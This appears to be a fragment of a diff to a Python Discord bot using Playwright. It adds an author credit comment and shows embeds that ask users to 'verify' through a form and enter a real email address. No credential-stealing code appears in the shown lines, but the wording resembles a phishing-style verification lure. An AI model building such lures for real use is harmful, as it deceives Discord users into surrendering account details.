@@ -13,6 +13,7 @@ from playwright.async_api import async_playwright
 #define
 listofpeople = []
 
+# Made by 24McNuggets and Portalwol
 
 embed = discord.Embed(title="Verification", description="By verifying through the form, you will gain access to the rest of the Discord server. Please click the button below to proceed with the verification process. Thank you.", color=40192)
 embed4 = discord.Embed(title="❌ - Error", description="You've entered a fake or not exisiting email. Please enter your real email address. \n Thank you.", color=40192)
